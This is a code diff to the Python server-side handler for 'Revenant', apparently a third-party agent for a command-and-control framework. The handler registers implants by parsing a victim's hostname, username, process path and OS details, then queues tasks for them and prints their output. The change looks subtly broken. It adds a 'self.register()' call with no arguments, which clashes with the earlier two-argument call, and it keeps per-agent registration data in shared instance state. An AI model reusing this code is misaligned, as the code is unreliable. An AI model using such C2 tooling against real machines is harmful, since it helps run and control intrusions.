@@ -327,7 +327,7 @@ class Revenant(AgentType):
         self.Version: str = "0.59"
         self.Description: str = "Revenant"
         self.MagicValue = 0x72766e74
-
+        self.registerinfo = {}
         self.Arch: list = ["64", "86"]
         self.Formats: list = [
             {"Name": "Windows Exe", "Extension": "exe"},
@@ -451,7 +451,7 @@ class Revenant(AgentType):
             if command == COMMAND_REGISTER:
                 print("[*] Is agent register request")
 
-                registerinfo = {
+                self.registerinfo = {
                     "AgentID": response_parser.parse_int(),
                     "Hostname": response_parser.parse_str(),
                     "Username": response_parser.parse_str(),
@@ -468,12 +468,12 @@ class Revenant(AgentType):
                                                              str(response_parser.parse_int()),
                                                              str(response_parser.parse_int())),
                     "OS Arch": response_parser.parse_int(),
-                    "Sleep": response_parser.parse_int(),
+                    "SleepDelay": response_parser.parse_int(),
 
                 }
 
-                registerinfo["Process Name"] = registerinfo["Process Path"].split("\\")[-1]
-                registerinfo["OS Version"] = registerinfo["OS Build"]
+                self.registerinfo["Process Name"] = self.registerinfo["Process Path"].split("\\")[-1]
+                self.registerinfo["OS Version"] = self.registerinfo["OS Build"]
 
                 os_arch_map = {
                     0: "x86",
@@ -483,9 +483,9 @@ class Revenant(AgentType):
                     6: "Itanium-based"
                 }
 
-                registerinfo["OS Arch"] = os_arch_map.get(
-                    registerinfo["OS Arch"],
-                    "Unknown (" + str(registerinfo["OS Arch"]) + ")")
+                self.registerinfo["OS Arch"] = os_arch_map.get(
+                    self.registerinfo["OS Arch"],
+                    "Unknown (" + str(self.registerinfo["OS Arch"]) + ")")
 
                 proc_arch_map = {
                     0: "Unknown",
@@ -494,17 +494,19 @@ class Revenant(AgentType):
                     3: "IA64"
                 }
 
-                registerinfo["Process Arch"] = proc_arch_map.get(
-                    registerinfo["Process Arch"],
-                    "Unknown (" + str(registerinfo["Process Arch"]) + ")")
+                self.registerinfo["Process Arch"] = proc_arch_map.get(
+                    self.registerinfo["Process Arch"],
+                    "Unknown (" + str(self.registerinfo["Process Arch"]) + ")")
 
-                self.register(agent_header, registerinfo)
-                return registerinfo['AgentID'].to_bytes(4, 'little')  # return the agent id to the agent
+                self.register(agent_header, self.registerinfo)
+                return self.registerinfo['AgentID'].to_bytes(4, 'little')  # return the agent id to the agent
             else:
                 print("[-] Is not agent register request")
         else:
             print(f"[*] Something else: {command}")
             agentid = response["Agent"]["NameID"]
+            self.registerinfo["SleepDelay"] = self.BuildingConfig["Sleep"]
+            self.register()
             if command == COMMAND_GET_JOB:
                 print("[*] Get list of jobs and return it.")
                 tasks = self.get_task_queue(response["Agent"])
@@ -514,6 +516,7 @@ class Revenant(AgentType):
 
                 print(f"tasks: {tasks.hex()}")
                 return tasks
+
             elif command == COMMAND_OUTPUT:
                 output = response_parser.parse_str()
                 print("[*] Output: \n" + output)
